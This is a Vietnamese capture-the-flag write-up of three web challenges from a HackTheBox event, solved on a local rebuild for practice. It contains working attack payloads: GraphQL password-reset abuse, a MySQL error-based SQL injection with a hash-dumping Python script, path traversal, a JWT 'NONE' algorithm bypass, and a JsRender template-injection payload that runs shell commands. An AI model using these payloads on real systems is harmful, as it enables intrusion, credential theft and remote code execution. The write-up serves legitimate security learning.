---
title: Cyber-Apocalypse
published: 2025-08-09
description: 'Đây là writeup luyện tập tự build tại local của mình ở giải của hackthebox'
image: './image.png'
tags: [WEB]
category: 'CTF Writeup'
draft: false 
lang: 'vi'
---
## Writeup 
> Lưu ý: Đây là 1 sự kiện CTF cũ và tôi đã build lại cục bộ của mình để giải quyết và luyện tập về nó. <br>
> Web
  1. Passman
  2. Orbital
  3. Didactic Octo Paddles
## Passman
#### Tổng quan
> Độ khó chung với tôi (From 1-10 stars): ★★★★☆☆☆☆☆☆
#### Lý lịch
> Pandora phát hiện ra sự hiện diện của một gián điệp trong Bộ. Để hành động thận trọng, cô phải lấy được mật khẩu điều khiển chính của Bộ, được lưu trữ trong trình quản lý mật khẩu. Bạn có thể hack vào trình quản lý mật khẩu không? <br>
> <img width="520" height="660" alt="image" src="https://github.com/user-attachments/assets/3784de09-4063-46cf-bd55-78de47cce491" /> <br>
#### Liệt kê và Khai thác
Trang chủ <br>
<img width="760" height="449" alt="image" src="https://github.com/user-attachments/assets/e8c1b700-e1c6-4277-a480-683aaa99b076" /> <br>
Ở đây có chức năng đăng nhập với tôi sẽ đưa tải trọng <b>"OR 1=1-- -</b> để test bỏ qua đăng nhập nhưng không được ở đây có chức năng đăng kí và tôi sẽ tiến hành đăng kí rồi đăng nhập vào hệ thống chúng ta thấy được <br>
<img width="948" height="450" alt="image" src="https://github.com/user-attachments/assets/e1d822d8-114d-4a68-853f-0a2732de63f0" /><br>
chúng ta cùng tạo 1 template thử và sau khi tạo nó sẽ hiển thị như sau:<br>
<img width="908" height="320" alt="image" src="https://github.com/user-attachments/assets/69c6efe4-9a03-48da-9254-a983fc54c26c" /><br>
sau khi xem xét<a href="https://github.com/Capt-Webk5/Challenge-Web/tree/main/Cyber-Apocalypse-2023/Passman/web_passman/web_passman"> mã nguồn</a><br>
tôi phát hiện ra rằng ở trang web này có username admin với flag nằm ở password của nó vậy mục tiêu chúng ta làm sao để leo quyền admin để lấy flag? <br>
```note
INSERT INTO passman.saved_passwords (owner, type, address, username, password, note)
VALUES
    ('admin', 'Web', 'igms.htb', 'admin', 'HTB{fake_flag}', 'password'),
    ('louisbarnett', 'Web', 'spotify.com', 'louisbarnett', 'YMgC41@)pT+BV', 'student sub'),
    ('louisbarnett', 'Email', 'dmail.com', 'louisbarnett@dmail.com', 'L-~I6pOy42MYY#y', 'private mail'),
    ('ninaviola', 'Web', 'office365.com', 'ninaviola1', 'OfficeSpace##1', 'company email'),
    ('alvinfisher', 'App', 'Netflix', 'alvinfisher1979', 'efQKL2pJAWDM46L7', 'Family Netflix'),
    ('alvinfisher', 'Web', 'twitter.com', 'alvinfisher1979', '7wYz9pbbaH3S64LG', 'old twitter account');

GRANT ALL ON passman.* TO 'passman'@'%' IDENTIFIED BY 'passman' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```
sau khi tôi phân tích mã nguồn tôi thấy đáng chú ý tới tuyến đường (<b>views/database.js)<br>
```js
  async registerUser(email, username, password) {
		return new Promise(async (resolve, reject) => {
			let stmt = `INSERT INTO users(email, username, password) VALUES(?, ?, ?)`;
			this.connection.query(
                stmt,
                [
                    String(email),
                    String(username),
                    String(password)
                ],
                (err, _) => {
                    if(err)
                        reject(err);
                    resolve()
			    }
            )
		});
	}

    async loginUser(username, password) {
		return new Promise(async (resolve, reject) => {
			let stmt = `SELECT username, is_admin FROM users WHERE username = ? and password = ?`;
			this.connection.query(
                stmt,
                [
                    String(username),
                    String(password)
                ],
                (err, result) => {
                    if(err)
                        reject(err)
                    try {
                        resolve(JSON.parse(JSON.stringify(result)))
                    }
                    catch (e) {
                        reject(e)
                    }
			    }
            )
		});
	}
```
ở đây có 2 tuyến đường login và register quen thuộc rồi nhỉ nhưng tôi thấy điểm đáng chú ý ở tuyến login nó select username và is_admin để kiểm tra người dùng. <br>
```js
    async updatePassword(username, password) {
        return new Promise(async (resolve, reject) => {
            let stmt = `UPDATE users SET password = ? WHERE username = ?`;
            this.connection.query(
                stmt,
                [
                    String(password),
                    String(username)
                ],
                (err, _) => {
                    if(err)
                        reject(err)
                    resolve();
			    }
            )
        });
    }

    async getPhraseList(username) {
		return new Promise(async (resolve, reject) => {
			let stmt = `SELECT * FROM saved_passwords WHERE owner = ?`;
			this.connection.query(
                stmt,
                [
                    String(username)
                ],
                (err, result) => {
                    if(err)
                        reject(err)
                    try {
                        resolve(JSON.parse(JSON.stringify(result)))
                    }
                    catch (e) {
                        reject(e)
                    }
			    }
            )
		});
	}
```
ở đây nó có 2 hàm đặc biệt là updatepassword dùng để cập nhật mật khẩu người dùng thông qua username ồ thú vị vậy ý tưởng của tôi nãy ra hàm này có thể lợi dụng cập nhật password của chính admin không? Chúng ta cùng xem xét tuyến đường ("<b>helpders/GraphHelps.js</b>") và chúng ta có thể thấy <br>
```js
const mutationType = new GraphQLObjectType({
    name: 'Mutation',
    fields: {
        RegisterUser: {
            type: ResponseType,
            args: {
                email: { type: new GraphQLNonNull(GraphQLString) },
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    db.registerUser(args.email, args.username, args.password)
                        .then(() => resolve(response("User registered successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        LoginUser: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    db.loginUser(args.username, args.password)
                        .then(async (user) => {
                            if (user.length) {
                                let token = await JWTHelper.sign( user[0] );
                                resolve({
                                    message: "User logged in successfully!",
                                    token: token
                                });
                            };
                            reject(new Error("Username or password is invalid!"));
                        })
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        UpdatePassword: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.updatePassword(args.username, args.password)
                        .then(() => resolve(response("Password updated successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },
```
ở đây nó sẽ sử dụng name:Mutation với các function cụ thể đặc biệt chúng ta chú ý đên updatepassword nó sẽ lấy username và password tương ứng để thực hiện update tài khoản thông qua username vậy với những điều đã nói trên chúng ta có thể lợi dụng grapqh để updatepassword vậy chúng ta cùng thử nghiệm với tài khoản đăng kí vừa rồi.<br>
<img width="947" height="563" alt="image" src="https://github.com/user-attachments/assets/6c542ebf-430d-4a37-83db-f1be426bbf20" /> <br>
vâng chúng ta đã thành công cập nhật được tài khoản của chính mình vậy bây giờ chúng ta update tài khoản admin và đăng nhập vào nó để get flag <br>
<img width="934" height="557" alt="image" src="https://github.com/user-attachments/assets/9616c176-b8cf-4c83-baa9-08385873399e" /> <br>
login với tài khoản vừa update của admin và bùm: <br>
<img width="952" height="502" alt="image" src="https://github.com/user-attachments/assets/129f0c74-41cc-4399-b0da-40753850a3b6" /> <br>
> Flag: <b>HTB{OfficeSpace##1_grapqh_7wYz9pbbaH3S64LG}</b>
#### Kết luận
> 1. Lợi dụng grapqh để update password
## Orbital
#### Tổng quan
> Độ khó chung với tôi (From 1-10 stars): ★★★★☆☆☆☆☆☆
#### Lý lịch
> Để giải mã thông tin liên lạc của người ngoài hành tinh nắm giữ chìa khóa dẫn đến vị trí của họ, cô cần truy cập vào một bộ giải mã có khả năng tiên tiến - một bộ giải mã mà chỉ công ty Orbital mới sở hữu. Bạn có thể lấy được bộ giải mã đó không?<br>
<img width="517" height="625" alt="image" src="https://github.com/user-attachments/assets/0ac5e157-6410-4abe-b9e3-c4324e4488fb" /><br>
#### Liệt kê và khai thác
Trang chủ <br>
<img width="891" height="497" alt="image" src="https://github.com/user-attachments/assets/8287150f-d455-49fe-9ce6-b77d1f9857c2" /> <br>
Thì cũng như form login các bài trước tôi cũng sẽ thử tải trọng <b>' OR 1=1-- -</b> nhưng cũng failed :>> ở đây khi tôi nhập thử 1 giá trị nó sẽ báo lỗi <br>
<img width="784" height="451" alt="image" src="https://github.com/user-attachments/assets/49fc73a9-bd4d-485b-8247-7171d7da315f" /> <br>
không thể làm gì nhiều ở đây chúng ta cùng đọc <a href="https://github.com/Capt-Webk5/Challenge-Web/tree/main/Cyber-Apocalypse-2023/Orbital/web_orbital/web_orbital"> mã nguồn</a> <br>
sau khi xem xét thông tin mã nguồn tôi phát hiện được các tuyến đường đáng chú ý: <br>
```note
INSERT INTO orbital.users (username, password) VALUES ('admin', '$(genPass)');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Titan', 'Arcturus', 'Ice World Calling Red Giant', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Andromeda', 'Vega', 'Spiral Arm Salutations', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Proxima Centauri', 'Trappist-1', 'Lone Star Linkup', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('TRAPPIST-1h', 'Kepler-438b', 'Small World Symposium', 'communication.mp3');
INSERT INTO orbital.communication (source, destination, name, downloadable) VALUES ('Winky', 'Boop', 'Jelly World Japes', 'communication.mp3');
CREATE USER 'user'@'localhost' IDENTIFIED BY 'M@k3l@R!d3s$';
GRANT SELECT ON orbital.users TO 'user'@'localhost';
GRANT SELECT ON orbital.communication TO 'user'@'localhost';
FLUSH PRIVILEGES;
EOF
```
nó có giá trị username là <b>admin</b> với password được gen mã md5 với 32 byte và ở file <b>database.js</b><br>
```py
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)

    if user:
        passwordCheck = passwordVerify(user['password'], password)

        if passwordCheck:
            token = createJWT(user['username'])
            return token
    else:
        return False
```
ở đây chúng ta thấy rõ ràng giá trị username không được sử dụng prepare để đảm bảo đầu vào vậy nên nó dễ bị sqlinjection sau khi truy vấn username và password nó sẽ sử dụng hàm passwordVerify để kiểm tra password của chúng ta sau đó sử dụng createJWT để tạo token chúng ta với username tương ứng chúng ta cùng xem thử qua chức năng <b>passwordVerify</b> xử lí : <br>
```py
def passwordVerify(hashPassword, password):
    md5Hash = hashlib.md5(password.encode())

    if md5Hash.hexdigest() == hashPassword: return True
    else: return False
```
hàm này nó sẽ sử dụng so sánh mã hash md5 của mình đưa vào có giống với của mã hash hệ thống nếu đúng trả về thành công và ngược lại nói như vậy chúng ta có thể thử sqlinjection ở username tôi thử đưa tải trọng gây ra lỗi "\"" : <br>
<img width="953" height="564" alt="image" src="https://github.com/user-attachments/assets/8fab277e-edff-4f00-b986-90f1d7bc8adb" /><br>
như vậy chúng ta có thể xác định được chúng ta có thể sử dụng MYSQL Error Based để khai thác và ở <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based---extractvalue-function">payloadallthething</a> chúng ta có thể lấy tải trọng để thử leak password dữ liệu admin và sau dây tải trọng tôi đưa vào: <br>
```note
\" OR extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e)) -- 
```
<img width="950" height="564" alt="image" src="https://github.com/user-attachments/assets/9371f7fb-4032-4661-9f5a-4135444e0eb1" /><br>
như ở hình ảnh chúng tôi có thể leak được mã hash tương ứng với admin nhưng nó thiếu kí tự chúng ta cùng lùi lại 1 bước ở phần đầu tôi có nói admin nó genpass ra với 32 kí tự hash đúng không vậy bây giờ tôi sẽ viết tập lệnh python để leak hết mã hash của nó ra.<br>
```py
import requests
import re

BASE_URL = "http://127.0.0.1:1337/api/login"
HEADER = {
    "Content-Type": "application/json",
    "Origin": "http://127.0.0.1:1337",
    "Referer": "http://127.0.0.1:1337/"
}

def extract_char_value(pos):
    payload = f'" OR extractvalue(1,concat(0x7e,substring((SELECT password FROM users WHERE username=\'admin\'),{pos},1),0x7e)) -- -'
    data = {
        "username": payload,
        "password": "bl4ck0ut"
    }
    response = requests.post(BASE_URL, headers=HEADER, json=data)
    match = re.search(r"~([^~])~", response.text)
    if match:
        return match.group(1)
    else:
        print(f"[-] Failed Extract Value Hash")

def dump_hash_admin():
    hash_full = ""
    for pos in range(1, 33):
        char = extract_char_value(pos)
        if char:
            hash_full += char
            print(f"[+] Ký tự {pos}: {char}  =>  {hash_full}")
        else:
            print(f"[-] Không lấy được ký tự ở vị trí {pos}")
            break
    return hash_full

if __name__ == "__main__":
    print(f"[+] Bắt đầu extract giá trị hash")
    admin_hash = dump_hash_admin()
    print(f"[+] Done Found Hash Admin: \n{admin_hash}")
```
```note
┌──(bl4ck0ut㉿DESKTOP-NC78VN5)-[~]
└─$ python3 a.py
[+] Bắt đầu extract giá trị hash
[+] Ký tự 1: 2  =>  2
[+] Ký tự 2: a  =>  2a
[+] Ký tự 3: c  =>  2ac
[+] Ký tự 4: b  =>  2acb
[+] Ký tự 5: 5  =>  2acb5
[+] Ký tự 6: b  =>  2acb5b
[+] Ký tự 7: 6  =>  2acb5b6
[+] Ký tự 8: 6  =>  2acb5b66
[+] Ký tự 9: 0  =>  2acb5b660
[+] Ký tự 10: 5  =>  2acb5b6605
[+] Ký tự 11: f  =>  2acb5b6605f
[+] Ký tự 12: 3  =>  2acb5b6605f3
[+] Ký tự 13: 3  =>  2acb5b6605f33
[+] Ký tự 14: 6  =>  2acb5b6605f336
[+] Ký tự 15: 6  =>  2acb5b6605f3366
[+] Ký tự 16: 0  =>  2acb5b6605f33660
[+] Ký tự 17: 7  =>  2acb5b6605f336607
[+] Ký tự 18: 6  =>  2acb5b6605f3366076
[+] Ký tự 19: 6  =>  2acb5b6605f33660766
[+] Ký tự 20: 5  =>  2acb5b6605f336607665
[+] Ký tự 21: 0  =>  2acb5b6605f3366076650
[+] Ký tự 22: 6  =>  2acb5b6605f33660766506
[+] Ký tự 23: 8  =>  2acb5b6605f336607665068
[+] Ký tự 24: 6  =>  2acb5b6605f3366076650686
[+] Ký tự 25: b  =>  2acb5b6605f3366076650686b
[+] Ký tự 26: f  =>  2acb5b6605f3366076650686bf
[+] Ký tự 27: d  =>  2acb5b6605f3366076650686bfd
[+] Ký tự 28: e  =>  2acb5b6605f3366076650686bfde
[+] Ký tự 29: 5  =>  2acb5b6605f3366076650686bfde5
[+] Ký tự 30: 4  =>  2acb5b6605f3366076650686bfde54
[+] Ký tự 31: c  =>  2acb5b6605f3366076650686bfde54c
[+] Ký tự 32: 2  =>  2acb5b6605f3366076650686bfde54c2
[+] Done Found Hash Admin:
2acb5b6605f3366076650686bfde54c2
```
tôi đã leak thành công với hash admin và sau đó tôi sử dụng tool <a href="https://md5.gromweb.com/?md5=a4b9f64e5d9c2a7d3e8c9174b0a1e5d9"> rever hashmd5</a> để chuyển đổi dữ liệu <br>
<img width="869" height="347" alt="image" src="https://github.com/user-attachments/assets/1bd560eb-5fdf-414e-ba89-338bbaae732f" /><br>
và chúng tôi tìm được chuỗi tương ứng: <b>DUMMY_PASSWORD</b> à đây là nó set sẵn vì tôi build local nên không thể lấy chuỗi thực tế từ server người xây dựng . Chúng ta cùng login tương ứng  <b>admin:DUMMY_PASSWORD</b> <br>
<img width="940" height="564" alt="image" src="https://github.com/user-attachments/assets/70b84e2b-c1d6-4f75-a06e-c303dd001fe8" /> <br>
tiếp theo hành trình khai thác tiếp flag tôi xem mã nguồn tôi phát hiện được ở tuyến đường (<b>blueprints/routes.py</b>) <br>
```py
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
    if not request.is_json:
        return response('Invalid JSON!'), 400
    
    data = request.get_json()
    communicationName = data.get('name', '')

    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
    except:
        return response('Unable to retrieve the communication'), 400
```
ở /export này nó sẽ trích xuất dữ liệu hình như về âm thanh vì ở source có thấy, với tham số đầu vào chẳng hạn như : "name":"communication.mp3" đặc biệt nó ở /communications nó không được lọc kĩ đầu vào nên về cơ bản nó dính lỗ hổng PathTravelsal vâng chính nó chúng ta cùng thử nghiệm /etc/passwd <br>
<img width="939" height="557" alt="image" src="https://github.com/user-attachments/assets/45919b8e-e8e4-4e27-ae07-d295d4194e57" /> <br>
và tới đây chúng ta đã trích được vậy bây giờ thử đọc flag bằng cách duyệt thư mục ../../flag nhưng tôi failed và ở dockerfile: <br>
```note
# copy flag
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/
```
ở tuyến đường /signal_sleuth_firmware mới có flag nên tôi nhầm :>>> tải trọng cuối cùng:
```note
{
"name":"../../../signal_sleuth_firmware"
}
```
<img width="947" height="563" alt="image" src="https://github.com/user-attachments/assets/12789d3e-dce8-4e84-84be-5c811f36fc13" /><br>
> Flag: <b>HTB{p4r4m3t3r1z4t10n_EXTRA_LONG_RANDOM_DATA_1234567890}</b>
#### Kết luận
> Những gì tôi học được:
> 1. Sử dụng Error_Mysql để leak dữ liệu với mã hash
> 2. Khai thác Pathtravel thông qua export dữ liệu
## Didactic Octo Paddles
#### Tổng quan
> Độ khó chung với tôi (From 1-10 stars): ★★★★★★☆☆☆☆
#### Lý lịch
> Bạn được Bộ Gián điệp Liên Thiên hà thuê để thu hồi một di vật hùng mạnh được cho là ẩn giấu trong một cửa hàng mái chèo nhỏ bên bờ sông. Bạn phải hack vào hệ thống của cửa hàng mái chèo để lấy thông tin về vị trí của di vật. Thử thách cuối cùng của bạn là vô hiệu hóa các tàu ký sinh ngoài hành tinh và cứu nhân loại khỏi sự hủy diệt chắc chắn bằng cách thu hồi di vật ẩn giấu trong cửa hàng Mái chèo Bạch tuộc Didactic.<br>
<img width="524" height="683" alt="image" src="https://github.com/user-attachments/assets/5af6c993-0cca-46f0-b6b7-fee4314e53c5" /> <br>
#### Sự liệt kê
Trang chủ: <br>
<img width="911" height="497" alt="image" src="https://github.com/user-attachments/assets/adc25759-3ef1-48b8-a9da-97ccada36d0d" /> <br>
Đập vào mắt mình là 1 form login với tôi mọi khi thấy form login tôi sẽ thử tải trọng <b>' OR 1=1-- -</b> để bỏ qua nó nhưng với không khi tôi xác thực với tải trọng đó nó báo lỗi <br>
<img width="850" height="452" alt="image" src="https://github.com/user-attachments/assets/d921d9be-dd80-4956-acfb-59a1fc93b4b1" /> <br>
Không được. Chúng ta cùng đọc <a href="https://github.com/Capt-Webk5/Challenge-Web/tree/main/Cyber-Apocalypse-2023/Didactic-Octo-Paddles/web_didactic_octo_paddle/web_didactic_octo_paddle">mã nguồn</a> <br>
Sau khi xem xét mã nguồn chúng ta có thể đăng kí 1 tài khoản tại (<b>routes/index.js</b>) <br>
```js
 router.post("/register", async (req, res) => {
        try {
            const username = req.body.username;
            const password = req.body.password;

            if (!username || !password) {
                return res
                    .status(400)
                    .send(response("Username and password are required"));
            }

            const existingUser = await db.Users.findOne({
                where: { username: username },
            });
            if (existingUser) {
                return res
                    .status(400)
                    .send(response("Username already exists"));
            }

            await db.Users.create({
                username: username,
                password: bcrypt.hashSync(password),
            }).then(() => {
                res.send(response("User registered succesfully"));
            });
        } catch (error) {
            console.error(error);
            res.status(500).send({
                error: "Something went wrong!",
            });
        }
    });
```
<img width="668" height="382" alt="image" src="https://github.com/user-attachments/assets/f16e85e2-a408-409c-bacb-ab4882d12234" /> <br>
Đăng kí thành công chúng ta cùng đăng nhập vào tài khoản và ở đây sẽ xuất hiện 1 cửa hàng với các product <br>
<img width="920" height="486" alt="image" src="https://github.com/user-attachments/assets/0aa70bab-8272-463c-823c-00545ebd5656" /> <br>
Tại (<b>routes/index.js</b>) có tuyến đường admin<br>
```js
    router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```
Nó được xác thực bằng (AdminMiddleware) chúng ta cùng xem xét nó tại (<b>middleware/AdminMiddleware.js</b>) như sau: <br>
```js
const jwt = require("jsonwebtoken");
const { tokenKey } = require("../utils/authorization");
const db = require("../utils/database");

const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
    } catch (err) {
        return res.redirect("/login");
    }
    next();
};

module.exports = AdminMiddleware;
``` 
Ở đây nó sẽ dùng giải mã token nếu header thuật toán mà bằng giá trị <b>none</b> nó sẽ chuyển hướng chúng ta về login còn nếu mà <b>HS256</b> nó sẽ tìm kiếm user và sử dụng hàm verify để xác thực vậy mục tiêu bây giờ chúng ta cần làm gì để bypass xác thực được admin sau khi loay hoay tìm hiểu tôi phát hiện ra 1 thuật toán <b>NONE</b> có thể bypass và nó khác với <b>none</b> đúng không chúng ta cùng thử nghiệm điều đó session sau khi giải mã: <br> 
<img width="923" height="320" alt="image" src="https://github.com/user-attachments/assets/ccd59297-76e9-4532-b02b-5ce73b174b54" /> <br>
Vâng tôi đã bỏ qua được điều đó và truy cập vào /admin: <br>
<img width="923" height="541" alt="image" src="https://github.com/user-attachments/assets/169e7ca0-8f70-482f-bf0d-3ca218f3adcf" /> <br>
Và sau đó chúng ta hãy lùi lại 1 bước ở mã nguồn admin: <br>
```js
 router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
        } catch (error) {
            console.error(error);
            res.status(500).send("Something went wrong!");
        }
    });
```
Nó dùng <b>jsrender.templates</b> để hiển thị tên người dùng vậy liệu nó có lỗ hổng <b>SSTI</b> ở view hiển thị nó như sao:<br>
```html
<body>
  <div class="d-flex justify-content-center align-items-center flex-column" style="height: 100vh;">
    <h1>Active Users</h1>
    <ul class="list-group small-list">
      {{for users.split(',')}}
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>{{>}}</span>
        </li>
      {{/for}}
    </ul>
  </div>
</body>
```
sau đó tôi tìm kiếm <a href="https://appcheck-ng.com/template-injection-jsrender-jsviews/">jsrender ssti</a> Trong blog đó, có một tải trọng JsRender SSTI RCE và ghi như sau: .<br>
>Các công cụ tạo mẫu như JsRender cho phép nhà phát triển tạo một mẫu tĩnh để hiển thị trang HTML và nhúng dữ liệu động bằng Biểu thức Mẫu. Thông thường, các công cụ tạo mẫu sử dụng một biến thể của cú pháp đóng ngoặc nhọn để nhúng dữ liệu động; trong JsRender, thẻ "evaluate" có thể được sử dụng để hiển thị kết quả của một biểu thức JavaScript.<br>
<img width="523" height="238" alt="image" src="https://github.com/user-attachments/assets/745bf759-2b8e-40bb-a713-262476c655c7" /> <br>
> Do tính chất phản chiếu của JavaScript, ta có thể thoát khỏi ngữ cảnh hạn chế này . Một phương pháp để đạt được điều này là truy cập “constructor”thuộc tính đặc biệt của một hàm JavaScript tích hợp sẵn, cho phép ta truy cập vào hàm được sử dụng để tạo hàm (hoặc đối tượng) mà ta đang tham chiếu đến. Ví dụ: một số đối tượng JavaScript bao gồm chuỗi có một hàm mặc định được đặt tên toString()mà ta có thể tham chiếu trong biểu thức được chèn, ví dụ:\{\{:"test".toString()\}\} <br>
> Từ đây, chúng ta có thể truy cập hàm constructorcho phép chúng ta xây dựng một hàm mới bằng cách gọi hàm đó. Trong ví dụ này, chúng ta tạo một hàm ẩn danh được thiết kế để hiển thị hộp cảnh báo JavaScript. <br>
Và sau khi loay hoay tìm payload tôi có được tải trọng này hoạt động vì trong môi trường Node.js chúng ta có thể RCE thực thi (<b>cat /etc/passwd</b>) và chúng ta có thể đăng kí 1 tải khoản với username để get FLAG<br>
Tải trọng:<b>
```js
\{\{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()\}\}
```
Sau đó chúng ta cùng truy cập lại tài khoản đã tạo trước đó sửa đổi thuật toán như khi trước thực hiện và truy xuất flag <br>
```html
<li class="list-group-item d-flex justify-content-between align-items-center ">
    <span>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
    </span>
</li>
```
> Flag: HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}<br>
## Tổng Kết <br>
> Những gì tôi học được như sau: <br>
> 1. Bỏ qua tiêu đề thuật toán <b>"JWT":"NONE"</b><br>
> 2. Khai thác RCE thông qua JsRender SSTI<br>
